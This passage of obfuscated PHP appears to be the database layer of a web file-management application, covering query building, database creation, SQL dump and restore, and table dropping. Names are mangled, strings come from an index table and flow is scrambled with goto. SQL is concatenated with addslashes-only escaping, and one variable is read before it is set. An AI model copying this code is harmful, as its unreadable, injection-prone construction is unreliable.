(is_array($cß¢î÷«Ûå)) { foreach ($cß¢î÷«Ûå as $a«¼ïóÙö => $A³Í¯˜¥»ç) { if (!1 !== stripos($A³Í¯˜¥»ç, $F»ÈËŞ¿®[954])) { $DÇĞõ²ØĞ .= $F»ÈËŞ¿®[60] . $A³Í¯˜¥»ç; } else { $DÇĞõ²ØĞ .= $F»ÈËŞ¿®[955] . $A³Í¯˜¥»ç; } } } else { $DÇĞõ²ØĞ .= $F»ÈËŞ¿®[955] . $cß¢î÷«Ûå; } } $DÇĞõ²ØĞ = preg_replace($F»ÈËŞ¿®[956], think_config($F»ÈËŞ¿®[862]) . $F»ÈËŞ¿®[957], $DÇĞõ²ØĞ); return $DÇĞõ²ØĞ; } protected function parseOrder($AŒÊÌ››Ş) { $d‡Èµ³…°š =& $_SERVER[±á õÁ]; if (is_array($AŒÊÌ››Ş)) { $cù­¨ëîÒŸ = array(); foreach ($AŒÊÌ››Ş as $aÉÅ¶Òö×Í => $fÍ¬ÔêÎ¶) { if (is_numeric($aÉÅ¶Òö×Í)) { $cù­¨ëîÒŸ[] = $this->parseKey($fÍ¬ÔêÎ¶); } else { $fÍ¬ÔêÎ¶ = in_array(strtoupper(trim($fÍ¬ÔêÎ¶)), array($d‡Èµ³…°š[958], $d‡Èµ³…°š[959])) ? $d‡Èµ³…°š[60] . $fÍ¬ÔêÎ¶ : $d‡Èµ³…°š[43]; if (preg_match($d‡Èµ³…°š[960], $aÉÅ¶Òö×Í)) { $cù­¨ëîÒŸ[] = $this->parseKey($aÉÅ¶Òö×Í) . $fÍ¬ÔêÎ¶; } else { think_exception($d‡Èµ³…°š[961] . $aÉÅ¶Òö×Í); } } } $AŒÊÌ››Ş = implode($d‡Èµ³…°š[57], $cù­¨ëîÒŸ); } return !empty($AŒÊÌ››Ş) ? $d‡Èµ³…°š[962] . $AŒÊÌ››Ş : $d‡Èµ³…°š[43]; } protected function parseGroup($aÍçáãÖ÷º) { $a‡®Õôšò =& $_SERVER[±á õÁ]; return !empty($aÍçáãÖ÷º) ? $a‡®Õôšò[963] . $aÍçáãÖ÷º : $a‡®Õôšò[43]; } protected function parseHaving($F‘¡È‡Ç÷Ú) { $fÆâİ–ª›¦ =& $_SERVER[±á õÁ]; return !empty($F‘¡È‡Ç÷Ú) ? $fÆâİ–ª›¦[964] . $F‘¡È‡Ç÷Ú : $fÆâİ–ª›¦[43]; } protected function parseComment($DöŸÚëˆ—Ò) { $e¤Ì¼Òã˜  =& $_SERVER[±á õÁ]; return !empty($DöŸÚëˆ—Ò) ? $e¤Ì¼Òã˜ [965] . $DöŸÚëˆ—Ò . $e¤Ì¼Òã˜ [966] : $e¤Ì¼Òã˜ [43]; } protected function parseDistinct($b“¥³÷ÀÈ§) { $FŸõ•‹Ëä­ =& $_SERVER[±á õÁ]; return !empty($b“¥³÷ÀÈ§) ? $FŸõ•‹Ëä­[967] : $FŸõ•‹Ëä­[43]; } protected function parseUnion($b“ïê¯è·¢) { $d§‚í…ŒË =& $_SERVER[±á õÁ]; if (empty($b“ïê¯è·¢)) { return $d§‚í…ŒË[43]; } if (isset($b“ïê¯è·¢[$d§‚í…ŒË[351]])) { $fŠ‘ğ†ÍÏ = $d§‚í…ŒË[968]; unset($b“ïê¯è·¢[$d§‚í…ŒË[351]]); } else { $fŠ‘ğ†ÍÏ = $d§‚í…ŒË[969]; } foreach ($b“ïê¯è·¢ as $AêÏ‘£ŒÜ«) { $A¡öÒÀ¯¨»[] = $fŠ‘ğ†ÍÏ . (is_array($AêÏ‘£ŒÜ«) ? $this->buildSelectSql($AêÏ‘£ŒÜ«) : $AêÏ‘£ŒÜ«); } return implode($d§‚í…ŒË[60], $A¡öÒÀ¯¨»); } public function insert($CØÄïÕé’‰, $dóõ¸ìØ = array(), $c—¡œ‰÷‚˜ = false) { goto B‚…¹ïÜ´ƒ; B‚…¹ïÜ´ƒ: $C¡­„£½ˆ› =& $_SERVER[±á õÁ]; $C‡„Øİˆ–È = $CÆÁœÏë¾ = array(); $this->model = $dóõ¸ìØ[$C¡­„£½ˆ›[284]]; goto f³Û½ËÀ´Ü; F¯ÎøŠ‡½‚: $f­¢ª­óÚª .= $this->parseComment(!empty($dóõ¸ìØ[$C¡­„£½ˆ›[357]]) ? $dóõ¸ìØ[$C¡­„£½ˆ›[357]] : $C¡­„£½ˆ›[43]); return $this->execute($f­¢ª­óÚª, $this->parseBind(!empty($dóõ¸ìØ[$C¡­„£½ˆ›[288]]) ? $dóõ¸ìØ[$C¡­„£½ˆ›[288]] : array())); goto aÀÓ§ìÄ¾à; f³Û½ËÀ´Ü: foreach ($CØÄïÕé’‰ as $B¿ÙøÔååƒ => $C©ğ¨ø„Ä¿) { if (is_array($C©ğ¨ø„Ä¿) && $C¡­„£½ˆ›[300] == $C©ğ¨ø„Ä¿[0]) { $CÆÁœÏë¾[] = $this->parseKey($B¿ÙøÔååƒ); $C‡„Øİˆ–È[] = $C©ğ¨ø„Ä¿[1]; } elseif (is_scalar($C©ğ¨ø„Ä¿) || is_null($C©ğ¨ø„Ä¿)) { $CÆÁœÏë¾[] = $this->parseKey($B¿ÙøÔååƒ); $C‡„Øİˆ–È[] = $this->parseValue($C©ğ¨ø„Ä¿); } } $f­¢ª­óÚª = ($c—¡œ‰÷‚˜ ? $C¡­„£½ˆ›[840] : $C¡­„£½ˆ›[841]) . $C¡­„£½ˆ›[842] . $this->parseTable($dóõ¸ìØ[$C¡­„£½ˆ›[282]]) . $C¡­„£½ˆ›[836] . implode($C¡­„£½ˆ›[57], $CÆÁœÏë¾) . $C¡­„£½ˆ›[837] . implode($C¡­„£½ˆ›[57], $C‡„Øİˆ–È) . $C¡­„£½ˆ›[838]; $f­¢ª­óÚª .= $this->parseLock(isset($dóõ¸ìØ[$C¡­„£½ˆ›[795]]) ? $dóõ¸ìØ[$C¡­„£½ˆ›[795]] : !1); goto F¯ÎøŠ‡½‚; aÀÓ§ìÄ¾à: } public function selectInsert($c‚ßã”¸ãÁ, $bŒç¾±Ğì, $f¹¸ó™İ¬÷ = array()) { goto bÎãÏôñÅ; bÎãÏôñÅ: $a½°Ñ¢è¿ =& $_SERVER[±á õÁ]; $this->model = $f¹¸ó™İ¬÷[$a½°Ñ¢è¿[284]]; if (is_string($c‚ßã”¸ãÁ)) { $c‚ßã”¸ãÁ = explode($a½°Ñ¢è¿[57], $c‚ßã”¸ãÁ); } goto EÄƒ¿ËêìÁ; EÄƒ¿ËêìÁ: array_walk($c‚ßã”¸ãÁ, array($this, $a½°Ñ¢è¿[839])); $EÀŠ ¾ë¸ = $a½°Ñ¢è¿[970] . $this->parseTable($bŒç¾±Ğì) . $a½°Ñ¢è¿[836] . implode($a½°Ñ¢è¿[57], $c‚ßã”¸ãÁ) . $a½°Ñ¢è¿[948]; $EÀŠ ¾ë¸ .= $this->buildSelectSql($f¹¸ó™İ¬÷); goto bØ‰äóÎõÄ; bØ‰äóÎõÄ: return $this->execute($EÀŠ ¾ë¸, $this->parseBind(!empty($f¹¸ó™İ¬÷[$a½°Ñ¢è¿[288]]) ? $f¹¸ó™İ¬÷[$a½°Ñ¢è¿[288]] : array())); goto CÃ›‚÷‰Õ¢; CÃ›‚÷‰Õ¢: } public function update($cÜ‰Ãñ…ùˆ, $FÑù£Éğ–œ) { $fØä÷áİÀÍ =& $_SERVER[±á õÁ]; $this->model = $FÑù£Éğ–œ[$fØä÷áİÀÍ[284]]; $B“Ö ÇÑö = $fØä÷áİÀÍ[971] . $this->parseTable($FÑù£Éğ–œ[$fØä÷áİÀÍ[282]]) . $this->parseSet($cÜ‰Ãñ…ùˆ) . $this->parseWhere(!empty($FÑù£Éğ–œ[$fØä÷áİÀÍ[278]]) ? $FÑù£Éğ–œ[$fØä÷áİÀÍ[278]] : $fØä÷áİÀÍ[43]) . $this->parseOrder(!empty($FÑù£Éğ–œ[$fØä÷áİÀÍ[366]]) ? $FÑù£Éğ–œ[$fØä÷áİÀÍ[366]] : $fØä÷áİÀÍ[43]) . $this->parseLimit(!empty($FÑù£Éğ–œ[$fØä÷áİÀÍ[295]]) ? $FÑù£Éğ–œ[$fØä÷áİÀÍ[295]] : $fØä÷áİÀÍ[43]) . $this->parseLock(isset($FÑù£Éğ–œ[$fØä÷áİÀÍ[795]]) ? $FÑù£Éğ–œ[$fØä÷áİÀÍ[795]] : !1) . $this->parseComment(!empty($FÑù£Éğ–œ[$fØä÷áİÀÍ[357]]) ? $FÑù£Éğ–œ[$fØä÷áİÀÍ[357]] : $fØä÷áİÀÍ[43]); return $this->execute($B“Ö ÇÑö, $this->parseBind(!empty($FÑù£Éğ–œ[$fØä÷áİÀÍ[288]]) ? $FÑù£Éğ–œ[$fØä÷áİÀÍ[288]] : array())); } public function delete($D°ø¸ğÜ = array()) { $fîÏâàà =& $_SERVER[±á õÁ]; $this->model = $D°ø¸ğÜ[$fîÏâàà[284]]; $BæšçíÅ¬ = $fîÏâàà[972] . $this->parseTable($D°ø¸ğÜ[$fîÏâàà[282]]) . $this->parseWhere(!empty($D°ø¸ğÜ[$fîÏâàà[278]]) ? $D°ø¸ğÜ[$fîÏâàà[278]] : $fîÏâàà[43]) . $this->parseOrder(!empty($D°ø¸ğÜ[$fîÏâàà[366]]) ? $D°ø¸ğÜ[$fîÏâàà[366]] : $fîÏâàà[43]) . $this->parseLimit(!empty($D°ø¸ğÜ[$fîÏâàà[295]]) ? $D°ø¸ğÜ[$fîÏâàà[295]] : $fîÏâàà[43]) . $this->parseLock(isset($D°ø¸ğÜ[$fîÏâàà[795]]) ? $D°ø¸ğÜ[$fîÏâàà[795]] : !1) . $this->parseComment(!empty($D°ø¸ğÜ[$fîÏâàà[357]]) ? $D°ø¸ğÜ[$fîÏâàà[357]] : $fîÏâàà[43]); return $this->execute($BæšçíÅ¬, $this->parseBind(!empty($D°ø¸ğÜ[$fîÏâàà[288]]) ? $D°ø¸ğÜ[$fîÏâàà[288]] : array())); } public function select($bğªõª¡ëë = array()) { goto aÙÒÓì°÷“; aÙÒÓì°÷“: $eëŒôéÄÃ¸ =& $_SERVER[±á õÁ]; $this->model = $bğªõª¡ëë[$eëŒôéÄÃ¸[284]]; $eäàïØÍÚ† = $this->buildSelectSql($bğªõª¡ëë); goto aì±Ø ø”; AøÆÒÃË å: if ($e¾ÆºÚÜ©è && !1 !== $F‰ĞÀ¦ô½¾) { think_cache($e«×°œ•Ñ¿, $F‰ĞÀ¦ô½¾, $e¾ÆºÚÜ©è); } return $F‰ĞÀ¦ô½¾; goto a„Å£Ëò‘º; aì±Ø ø”: $e¾ÆºÚÜ©è = isset($bğªõª¡ëë[$eëŒôéÄÃ¸[352]]) ? $bğªõª¡ëë[$eëŒôéÄÃ¸[352]] : !1; if ($e¾ÆºÚÜ©è) { $e«×°œ•Ñ¿ = is_string($e¾ÆºÚÜ©è[$eëŒôéÄÃ¸[99]]) ? $e¾ÆºÚÜ©è[$eëŒôéÄÃ¸[99]] : $eëŒôéÄÃ¸[973] . md5($eäàïØÍÚ†); $A½«ÛÏ½Ğˆ = think_cache($e«×°œ•Ñ¿, $eëŒôéÄÃ¸[43], $e¾ÆºÚÜ©è); if (!1 !== $A½«ÛÏ½Ğˆ) { return $A½«ÛÏ½Ğˆ; } } $F‰ĞÀ¦ô½¾ = $this->query($eäàïØÍÚ†, $this->parseBind(!empty($bğªõª¡ëë[$eëŒôéÄÃ¸[288]]) ? $bğªõª¡ëë[$eëŒôéÄÃ¸[288]] : array())); goto AøÆÒÃË å; a„Å£Ëò‘º: } public function buildSelectSql($Fµ¶ß’Ñ = array()) { goto D…®°™«¯×; d©‘Ó³„„: return $a¥—œ±á²; goto Eõ…ñğØîº; A×ïâ¯„âŒ: $a¥—œ±á² = $this->parseSql($this->selectSql, $Fµ¶ß’Ñ); $a¥—œ±á² .= $this->parseLock(isset($Fµ¶ß’Ñ[$bÑ·Šö«—[795]]) ? $Fµ¶ß’Ñ[$bÑ·Šö«—[795]] : !1); if (isset($eõ¸ĞŒ˜¥â)) { think_cache($eõ¸ĞŒ˜¥â, $a¥—œ±á²); } goto d©‘Ó³„„; D…®°™«¯×: $bÑ·Šö«— =& $_SERVER[±á õÁ]; if (isset($Fµ¶ß’Ñ[$bÑ·Šö«—[356]])) { if (strpos($Fµ¶ß’Ñ[$bÑ·Šö«—[356]], $bÑ·Šö«—[57])) { list($bñ‚˜¶ïõµ, $A‡‚µ¿“Ë») = explode($bÑ·Šö«—[57], $Fµ¶ß’Ñ[$bÑ·Šö«—[356]]); } else { $bñ‚˜¶ïõµ = $Fµ¶ß’Ñ[$bÑ·Šö«—[356]]; } $bñ‚˜¶ïõµ = $bñ‚˜¶ïõµ ? $bñ‚˜¶ïõµ : 1; $A‡‚µ¿“Ë» = isset($A‡‚µ¿“Ë») ? $A‡‚µ¿“Ë» : (is_numeric($Fµ¶ß’Ñ[$bÑ·Šö«—[295]]) ? $Fµ¶ß’Ñ[$bÑ·Šö«—[295]] : 20); $EË¤Ãº¢Ä = $A‡‚µ¿“Ë» * ((int) $bñ‚˜¶ïõµ - 1); $Fµ¶ß’Ñ[$bÑ·Šö«—[295]] = $EË¤Ãº¢Ä . $bÑ·Šö«—[57] . $A‡‚µ¿“Ë»; } if (think_config($bÑ·Šö«—[974])) { $eõ¸ĞŒ˜¥â = $bÑ·Šö«—[975] . md5(serialize($Fµ¶ß’Ñ)); $BÛ°¡Ï‘Åù = think_cache($eõ¸ĞŒ˜¥â); if ($BÛ°¡Ï‘Åù) { return $BÛ°¡Ï‘Åù; } } goto A×ïâ¯„âŒ; Eõ…ñğØîº: } public function parseSql($f³ƒ‘³¥Æ, $eâ˜Ñ¯Ü¥¼ = array()) { $fÜŠá„½å¯ =& $_SERVER[±á õÁ]; $f³ƒ‘³¥Æ = str_replace(array($fÜŠá„½å¯[976], $fÜŠá„½å¯[977], $fÜŠá„½å¯[978], $fÜŠá„½å¯[979], $fÜŠá„½å¯[980], $fÜŠá„½å¯[981], $fÜŠá„½å¯[982], $fÜŠá„½å¯[983], $fÜŠá„½å¯[984], $fÜŠá„½å¯[985], $fÜŠá„½å¯[986]), array($this->parseTable("{$eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[282]]}"), $this->parseDistinct(isset($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[987]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[987]] : !1), $this->parseField(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[276]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[276]] : $fÜŠá„½å¯[190]), $this->parseJoin(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[285]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[285]] : $fÜŠá„½å¯[43]), $this->parseWhere(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[278]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[278]] : $fÜŠá„½å¯[43]), $this->parseGroup(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[988]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[988]] : $fÜŠá„½å¯[43]), $this->parseHaving(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[989]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[989]] : $fÜŠá„½å¯[43]), $this->parseOrder(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[366]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[366]] : $fÜŠá„½å¯[43]), $this->parseLimit(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[295]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[295]] : $fÜŠá„½å¯[43]), $this->parseUnion(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[350]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[350]] : $fÜŠá„½å¯[43]), $this->parseComment(!empty($eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[357]]) ? $eâ˜Ñ¯Ü¥¼[$fÜŠá„½å¯[357]] : $fÜŠá„½å¯[43])), $f³ƒ‘³¥Æ); return $f³ƒ‘³¥Æ; } public function getLastSql($Fƒ…Ø½¨ë = '') { return $Fƒ…Ø½¨ë ? $this->modelSql[$Fƒ…Ø½¨ë] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($c‡“àŸğßÛ) { return addslashes($c‡“àŸğßÛ); } public function setModel($BŒôÂÈ“Ì) { $this->model = $BŒôÂÈ“Ì; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($C‹‰ÃÚ‚©‹, $AÀÃÎóµ¹Í = '') { $this->database = $C‹‰ÃÚ‚©‹; $this->type = $AÀÃÎóµ¹Í; } public function model($A´‚¼¾å¦… = '') { return new ModelBase($A´‚¼¾å¦…, $_SERVER[±á õÁ][43], $this->database); } public function db($eÇóäË¦ñ‘ = false) { goto b¬Ûğî†É­; fÆ’ºÔ„éÌ: $AâÅê«±ŞŒ = $e Ã°İœÆ[$c¾¥½ÜğÉñ[902]]; $e Ã°İœÆ[$c¾¥½ÜğÉñ[902]] = $c¾¥½ÜğÉñ[43]; if ($e Ã°İœÆ[$c¾¥½ÜğÉñ[747]] == $c¾¥½ÜğÉñ[748]) { $F¹Ğëãìö† = $e Ã°İœÆ[$c¾¥½ÜğÉñ[749]]; $e Ã°İœÆ[$c¾¥½ÜğÉñ[749]] = substr($F¹Ğëãìö†, 0, strrpos($F¹Ğëãìö†, $c¾¥½ÜğÉñ[990])); } goto Aõ·òáì‹Ô; AÄ¶®¼ÃÄÇ: $this->database = $e Ã°İœÆ; $Cù’¡ ¯Áá->execute("\x75\x73\145\40\x60{$AâÅê«±ŞŒ}\140"); return $Cù’¡ ¯Áá; goto FöíÈ–ïÓ£; Aõ·òáì‹Ô: $this->database = $e Ã°İœÆ; $Cù’¡ ¯Áá = $this->model()->db(); try { $cÈ­ÇÆÛª† = $Cù’¡ ¯Áá->execute("\x73\x68\x6f\167\x20\144\x61\x74\x61\x62\x61\163\x65\x73\x20\x6c\x69\x6b\145\x20\47{$AâÅê«±ŞŒ}\x27"); } catch (Exception $fö‰‰ÜÈ˜) { } goto Føõô¤×Ñ; Føõô¤×Ñ: if (!$cÈ­ÇÆÛª†) { $Cù’¡ ¯Áá->execute("\x63\x72\x65\141\164\145\40\x64\141\x74\x61\142\141\x73\x65\40\140{$AâÅê«±ŞŒ}\x60"); } $e Ã°İœÆ[$c¾¥½ÜğÉñ[902]] = $AâÅê«±ŞŒ; if ($e Ã°İœÆ[$c¾¥½ÜğÉñ[747]] == $c¾¥½ÜğÉñ[748]) { $e Ã°İœÆ[$c¾¥½ÜğÉñ[749]] .= $c¾¥½ÜğÉñ[990] . $AâÅê«±ŞŒ; } goto AÄ¶®¼ÃÄÇ; b¬Ûğî†É­: $c¾¥½ÜğÉñ =& $_SERVER[±á õÁ]; $e Ã°İœÆ = array_change_key_case($this->database); if ($this->type == $c¾¥½ÜğÉñ[19] || !$eÇóäË¦ñ‘) { return $this->model()->db(); } goto fÆ’ºÔ„éÌ; FöíÈ–ïÓ£: } public function createTable($FŸ¸¥¼¥, $cÁ¨é‰Ÿç“ = null) { $d°Õ¾õ–îè =& $_SERVER[±á õÁ]; if (!IO::exist($FŸ¸¥¼¥)) { ActionCall($d°Õ¾õ–îè[991], !0, 0); show_json(LNG($d°Õ¾õ–îè[992]), !1); } $bá—åËÇØ = sqlSplit(IO::getContent($FŸ¸¥¼¥)); foreach ($bá—åËÇØ as $c…øõ¸‡â¿) { if ($cÁ¨é‰Ÿç“) { $D±Î®âÔÄ = stripos($c…øõ¸‡â¿, $d°Õ¾õ–îè[993]) === 0; if ($D±Î®âÔÄ) { $cÁ¨é‰Ÿç“->task[$d°Õ¾õ–îè[994]] += 1; } } $this->model()->db()->execute($c…øõ¸‡â¿); if ($cÁ¨é‰Ÿç“ && $D±Î®âÔÄ) { preg_match($d°Õ¾õ–îè[995], $c…øõ¸‡â¿, $e²Š±Ø”¨); $cÁ¨é‰Ÿç“->task[$d°Õ¾õ–îè[996]] = $e²Š±Ø”¨[1]; $cÁ¨é‰Ÿç“->update(1); } } $this->taskToCache($cÁ¨é‰Ÿç“); } public function insertTable($E–Æ±ÙÀ, $fªà®õ‡â = null) { $f‹¡¾åĞëø =& $_SERVER[±á õÁ]; $CõÉŠ±ŞÉ¯ = $this->model()->db(); $eÅÔİ‡’ø§ = $D¤Ö¾Ÿ‚ÄÏ ? array($D¤Ö¾Ÿ‚ÄÏ) : $CõÉŠ±ŞÉ¯->getTables(); foreach ($E–Æ±ÙÀ as $fÙÜõªÍá) { $D¤Ö¾Ÿ‚ÄÏ = basename($fÙÜõªÍá, $f‹¡¾åĞëø[742]); if (!in_array($D¤Ö¾Ÿ‚ÄÏ, $eÅÔİ‡’ø§)) { continue; } if ($fªà®õ‡â) { $fªà®õ‡â->task[$f‹¡¾åĞëø[996]] = $D¤Ö¾Ÿ‚ÄÏ; } if (get_filesize($fÙÜõªÍá) == 0) { continue; } $E½Œéİ„ÃÕ = $this->sqlToDb($fÙÜõªÍá, $fªà®õ‡â); if (!$E½Œéİ„ÃÕ) { ActionCall($f‹¡¾åĞëø[991], !0, 0); show_json(LNG($f‹¡¾åĞëø[997]) . "\133{$D¤Ö¾Ÿ‚ÄÏ}\x5d", !1); } } $this->taskToCache($fªà®õ‡â); } public function sqlFromDb($AÅìáß‘‘, $CˆÊÒ×‹æË, $Dø˜ã’ã»‚ = null, $dë¾òî”ï³ = null) { goto aí†ÓšÛµî; A–ïº†™İ: $Eæµ™•Ê¥ß = $E¢’ö“Ÿó->getPk(); $E™¿Œç©¡ = $E¢’ö“Ÿó->getDbFields(); do { $DÎÔ±ÇÇ = $E¢’ö“Ÿó->field($E™¿Œç©¡)->order($Eæµ™•Ê¥ß . $_SERVER[±á õÁ][999])->selectPage($eİ¹¹ˆè, $aª»Øááôš); $CÀ³ê—‡Æ = isset($DÎÔ±ÇÇ[$_SERVER[±á õÁ][367]][$_SERVER[±á õÁ][369]]) ? $DÎÔ±ÇÇ[$_SERVER[±á õÁ][367]][$_SERVER[±á õÁ][369]] : 0; $dé¯¦èÀò = !empty($DÎÔ±ÇÇ[$_SERVER[±á õÁ][370]]) ? $DÎÔ±ÇÇ[$_SERVER[±á õÁ][370]] : array(); if (!($b¯Ùä²íÄ¨ = count($dé¯¦èÀò))) { break; } $fÂ“‚”ë¬Á = array(); foreach ($dé¯¦èÀò as $C¬¿Œƒ¡) { if ($AÅìáß‘‘ == $_SERVER[±á õÁ][1000] && $C¬¿Œƒ¡[$_SERVER[±á õÁ][39]] == $_SERVER[±á õÁ][1001]) { $F’£á÷É‘Ê = json_decode($C¬¿Œƒ¡[$_SERVER[±á õÁ][375]], !0); if ($F’£á÷É‘Ê[$_SERVER[±á õÁ][38]] == date($_SERVER[±á õÁ][715]) && !$F’£á÷É‘Ê[$_SERVER[±á õÁ][714]]) { continue; } } if ($dë¾òî”ï³) { $C¬¿Œƒ¡[$_SERVER[±á õÁ][85]] = "\x7b\x69\157\72{$dë¾òî”ï³}\x7d" . substr($C¬¿Œƒ¡[$_SERVER[±á õÁ][85]], strlen("\x7b\x69\x6f\x3a{$C¬¿Œƒ¡[$_SERVER[±á õÁ][768]]}\x7d")); $C¬¿Œƒ¡[$_SERVER[±á õÁ][768]] = $dë¾òî”ï³; } $fÂ“‚”ë¬Á[] = $_SERVER[±á õÁ][1002] . $this->sqlEncode($C¬¿Œƒ¡) . $_SERVER[±á õÁ][1003]; } $F£µ•¿ù¡ = "\x49\116\x53\x45\x52\124\x20\x49\x4e\124\117\40\x60{$AÅìáß‘‘}\x60\x20\x28\x60" . implode($_SERVER[±á õÁ][1004], $E™¿Œç©¡) . $_SERVER[±á õÁ][1005]; fwrite($E¼Ø®ŸŸ¤Á, $F£µ•¿ù¡ . implode($_SERVER[±á õÁ][1006], $fÂ“‚”ë¬Á) . $_SERVER[±á õÁ][77] . PHP_EOL); $aª»Øááôš++; $a›ŠÅ¨¬óã += $b¯Ùä²íÄ¨; if ($Dø˜ã’ã»‚) { $Dø˜ã’ã»‚->update($b¯Ùä²íÄ¨); } } while ($aª»Øááôš <= $CÀ³ê—‡Æ); goto E´ÓšÅ±ô¦; aí†ÓšÛµî: if ($Dø˜ã’ã»‚) { $Dø˜ã’ã»‚->task[$_SERVER[±á õÁ][996]] = $AÅìáß‘‘; } $E¢’ö“Ÿó = $this->model($AÅìáß‘‘); $a›ŠÅ¨¬óã = 0; goto DÊ–ÁÏ¦ŸÁ; E´ÓšÅ±ô¦: fclose($E¼Ø®ŸŸ¤Á); return $a›ŠÅ¨¬óã; goto b™‰•åÂëŒ; DÊ–ÁÏ¦ŸÁ: $aª»Øááôš = 1; $eİ¹¹ˆè = 500; $E¼Ø®ŸŸ¤Á = fopen($CˆÊÒ×‹æË, $_SERVER[±á õÁ][998]); goto A–ïº†™İ; b™‰•åÂëŒ: } public function sqlToDb($BÂˆ¥†Ö, $b°¸øğà¹‹ = null) { goto c¶à¡ÈÜÊ; c¶à¡ÈÜÊ: $EôáÏÒ¢æ =& $_SERVER[±á õÁ]; $EÅ–¾¼¥Œ = $this->model()->db(); $B…—’¼§‰Ê = @fopen($BÂˆ¥†Ö, $EôáÏÒ¢æ[1007]); goto f¡‡»±É; f¡‡»±É: if (!$B…—’¼§‰Ê) { return !1; } $d•³ŒÉçâë = 0; $f«£ï—¬Ñï = $EôáÏÒ¢æ[43]; goto Dğ¥Ù…İ°; Fßß¨’œªÕ: if (trim($f«£ï—¬Ñï)) { $f«£ï—¬Ñï = rtrim(trim($f«£ï—¬Ñï), $EôáÏÒ¢æ[77]); if (!$EÅ–¾¼¥Œ->execute($f«£ï—¬Ñï)) { return !1; } if ($b°¸øğà¹‹) { $b°¸øğà¹‹->update($d•³ŒÉçâë - 1); } } return !0; goto b÷êõó¬Ÿ; Dğ¥Ù…İ°: $cæË¢ºÌ¡‰ = 500 + 1; while (!feof($B…—’¼§‰Ê)) { if ($b°¸øğà¹‹ && $d•³ŒÉçâë != 0) { $b°¸øğà¹‹->task[$EôáÏÒ¢æ[994]] += 1; } $d•³ŒÉçâë++; $eƒêˆ¡›ì = trim(fgets($B…—’¼§‰Ê)); $f«£ï—¬Ñï .= $EôáÏÒ¢æ[60] . $this->sqlDecode($eƒêˆ¡›ì, $this->type); if ($d•³ŒÉçâë == $cæË¢ºÌ¡‰) { $f«£ï—¬Ñï = rtrim(trim($f«£ï—¬Ñï), $EôáÏÒ¢æ[77]); if (!$EÅ–¾¼¥Œ->execute($f«£ï—¬Ñï)) { return !1; } if ($b°¸øğà¹‹) { $b°¸øğà¹‹->update($d•³ŒÉçâë - 1); } $f«£ï—¬Ñï = $EôáÏÒ¢æ[43]; $d•³ŒÉçâë = 0; } } fclose($B…—’¼§‰Ê); goto Fßß¨’œªÕ; b÷êõó¬Ÿ: } public function dropTable($c”½ç„ãŠ = null) { $eÈô®¢Òá = $this->model()->db(); $aÉËÉŸÛã‘ = $c”½ç„ãŠ ? array($c”½ç„ãŠ) : $eÈô®¢Òá->getTables(); if (!$aÉËÉŸÛã‘) { return; } foreach ($aÉËÉŸÛã‘ as $c”½ç„ãŠ) { $eÈô®¢Òá->execute("\144\x72\x6f\x70\40\x74\x61\x62\x6c\145\40\151\146\x20\x65\x78\x69\x73\164\x73\x20\x60{$c”½ç„ãŠ}\140"); } } private function taskToCache($D÷–³ØØÇ = null) { $fîàè…âÀã =& $_SERVER[±á õÁ]; if (!$D÷–³ØØÇ) { return; } $C´×·ğñ = array($fîàè…âÀã[996] => $D÷–³ØØÇ->task[$fîàè…âÀã[996]], $fîàè…âÀã[994] => $D÷–³ØØÇ->task[$fîàè…âÀã[994]], $fîàè…âÀã[1008] => $D÷–³ØØÇ->task[$fîàè…âÀã[1008]]); if ($C´×·ğñ[$fîàè…âÀã[994]] == $C´×·ğñ[$fîàè…âÀã[1008]]) { $C´×·ğñ[$fîàè…âÀã[721]] = 1; } Cache::set($fîàè…âÀã[1009] . $D÷–³ØØÇ->task[$fîàè…âÀã[391]], $C´×·ğñ); $D÷–³ØØÇ->end(); } private function sqlEncode($D¼±ÚÍÓ˜) { $CîÎ®ÒÈÃ =& $_SERVER[±á õÁ]; $bÚ¡Û…Õéï = array(); foreach ($D¼±ÚÍÓ˜ as $A¤«æ²˜åà) { if (is_array($A¤«æ²˜åà)) { $A¤«æ²˜åà = json_encode_force($A¤«æ²˜åà); } $A¤«æ²˜åà = addslashes($A¤«æ²˜åà); $A¤«æ²˜åà = str_replace(array($CîÎ®ÒÈÃ[1010], $CîÎ®ÒÈÃ[14]), array($CîÎ®ÒÈÃ[1011], $CîÎ®ÒÈÃ[1012]), $A¤«æ²˜åà); $bÚ¡Û…Õéï[] = str_replace($CîÎ®ÒÈÃ[65], $CîÎ®ÒÈÃ[1013], $A¤«æ²˜åà); } return $CîÎ®ÒÈÃ[65] . implode($CîÎ®ÒÈÃ[1014], $bÚ¡Û…Õéï) . $CîÎ®ÒÈÃ[65]; } private function sqlDecode($e…ÎĞ†ÖÀá, $bŞ¯á˜Ú§Æ) { $fä…±ò­õÏ =& $_SERVER[±á õÁ]; $e…ÎĞ†ÖÀá = str_replace(array($fä…±ò­õÏ[1011], $fä…±ò­õÏ[1012]), array($fä…±ò­õÏ[1010], $fä…±ò­õÏ[14]), $e…ÎĞ†ÖÀá); if ($bŞ¯á˜Ú§Æ == $fä…±ò­õÏ[19]) { 